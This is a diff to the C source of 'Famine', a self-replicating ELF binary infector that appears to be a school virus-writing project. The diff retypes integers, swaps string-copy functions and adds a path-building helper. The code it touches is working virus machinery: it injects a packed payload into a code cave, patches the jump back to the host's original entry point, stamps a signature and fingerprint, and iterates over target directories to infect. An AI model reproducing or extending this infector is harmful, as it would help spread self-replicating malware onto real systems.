@@ -75,24 +75,22 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
 	t_patch *patch = &data->patch;
 
-	size_t signature_offset = (size_t)&sign - (size_t)&packer_start;
-
 	/* calculate the difference between the cave and the packer 
 	 * will always be positive cause .data is after the .text */
-	uint64_t addr_diff = data->cave.addr - data->packer.addr;
+	uint32_t addr_diff = data->cave.addr - data->packer.addr;
 
 	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);
 
 	char signature[SIGNATURE_SIZE];
-	ft_strlcpy(signature, sign, SIGNATURE_SIZE);
+	ft_strncpy(signature, sign, SIGNATURE_SIZE);
 
-	/* "Famine (c)oded by dxrxbxk - straboul:0000", 0x0a, 0 
-	 * reset the hash to 0000 */
+	/* "Famine (c)oded by dxrxbxk - straboul:numb", 0x0a, 0 
+	 * reset the hash (numb) to 0000 */
 	ft_memset(&signature[SIGNATURE_SIZE - 6], '0', 4);
 
 	update_fingerprint(&signature[ft_strlen(signature) - 14], data);
 
-	ft_strlcpy(patch->signature, signature, sizeof(patch->signature));
+	ft_strncpy(patch->signature, signature, sizeof(patch->signature));
 
 	patch->decrypt_size = data->cave.p_size;
 
@@ -103,7 +101,7 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
 static int packer_patch(t_data *data) {
 
-	size_t jmp_rel_offset = (size_t)&jmp_rel - (size_t)&packer_start;
+	uint16_t jmp_rel_offset = (uint16_t)((char *)&jmp_rel - (char *)&packer_start);
 
 	init_patch(data, jmp_rel_offset);
 
@@ -128,7 +126,7 @@ static int	inject(t_data *data) {
 
 	packer_patch(data);
 
-	uint8_t jmp_offset = (uint8_t)((char *)&jmp_end - (char *)&_start + 1);
+	uint16_t jmp_offset = (uint8_t)((char *)&jmp_end - (char *)&_start + 1);
 
 	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, jmp_offset + JMP_SIZE);
 
@@ -160,10 +158,10 @@ static int	infect(const char *filename, const char *self_name)
 	ft_memset(&data, 0, sizeof(t_data));
 
 	/* copy the name of the target */
-	ft_strlcpy(data.target_name, filename, sizeof(data.target_name));
+	ft_strncpy(data.target_name, filename, sizeof(data.target_name));
 
 	/* get our own name */
-	ft_strlcpy(data.self_name, self_name, sizeof(data.self_name));
+	ft_strncpy(data.self_name, self_name, sizeof(data.self_name));
 
 	/* calculate the size of the payload before the mapping */
 	data.cave.p_size = (char *)&end - (char *)&_start;
@@ -235,7 +233,16 @@ static int execute_prog(const char *filename)
 	return 0;
 }
 
-static void open_file(const char *file, const char *self_path, size_t *counter)
+static void	make_path(char *path, const char *dir, const char *file)
+{
+	char *ptr = path;
+	char slash[] = "/";
+	ptr = ft_stpncpy(ptr, dir, PATH_MAX - (ptr - path));
+	ptr = ft_stpncpy(ptr, slash, PATH_MAX - (ptr - path));
+	ft_stpncpy(ptr, file, PATH_MAX - (ptr - path));
+}
+
+static void open_file(const char *file, const char *self_path, uint16_t *counter)
 {
 
 	int fd = _syscall(SYS_open, file, O_RDONLY);
@@ -289,7 +296,7 @@ void	famine(void)
 		return ;
 	}
 
-	size_t counter = 0;
+	uint16_t counter = 0;
 	char host_name[PATH_MAX];
 
 	const char *paths[] = {
